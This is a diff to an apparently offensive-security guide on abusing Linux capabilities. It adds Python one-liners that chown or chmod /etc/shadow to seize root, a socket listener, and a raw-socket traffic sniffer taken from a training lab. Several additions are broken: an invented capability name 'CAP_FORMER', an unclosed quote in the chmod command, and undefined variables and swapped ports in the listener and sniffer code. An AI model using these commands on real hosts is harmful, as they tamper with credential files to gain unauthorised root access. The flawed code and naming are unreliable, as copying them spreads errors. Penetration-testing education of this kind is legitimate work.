@@ -1128,10 +1128,22 @@ Note that if the **environment** is giving this capability you could also use **
 
 #### Example with binary
 
-Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change roots password**, and escalate privileges:
+Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change root password**, and escalate privileges:
 
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
+```
+
+### CAP\_FORMER
+
+**This means that it's possible to change the permission of any file.**
+
+#### Example with binary
+
+If python has this capability you can modify the permissions of the shadow file, **change root password**, and escalate privileges:
+
+```bash
+python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
 
 ### CAP\_KILL
@@ -1166,6 +1178,9 @@ s=socket.socket()
 s.bind(('0.0.0.0', 80))
 s.listen(1)
 conn, addr = s.accept()
+while True:
+        output = connection.recv(1024).strip();
+        print(output)
 ```
 {% endtab %}
 
@@ -1178,6 +1193,58 @@ s.connect(('10.10.10.10',500))
 ```
 {% endtab %}
 {% endtabs %}
+
+### CAP\_NET\_RAW
+
+**This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.
+
+#### Example with binary
+
+The following example is **`python2`** code that can be useful to intercept traffic of the "**lo**" \(**localhost**\) interface. The code is from the lab "_The Basics: CAP-NET\_BIND + NET\_RAW_" from [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com/)
+
+```python
+import socket
+import struct
+
+flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]
+
+def getFlag(flag_value):
+    flag=""
+    for i in xrange(8,-1,-1):
+        if( flag_value & 1 <<i ):
+            flag= flag + flags[8-i] + ","
+    return flag[:-1]
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
+s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
+s.bind(("lo",0x0003))
+
+flag=""
+count=0
+while True:
+    frame=s.recv(4096)
+    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
+    proto=ip_header[6]
+    ip_header_size = (ip_header[0] & 0b1111) * 4
+    if(proto==6):
+        protocol="TCP"
+        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
+        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
+        dst_port=tcp_header[0]
+        src_port=tcp_header[1]
+        flag=" FLAGS: "+getFlag(tcp_header[4])
+    
+    elif(proto==17):
+        protocol="UDP"
+        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
+        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
+        dst_port=udp_header[0]
+        src_port=udp_header[1]
+    
+    if (proto == 17 or proto == 6):
+        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
+        count=count+1
+```
 
 ## References
 
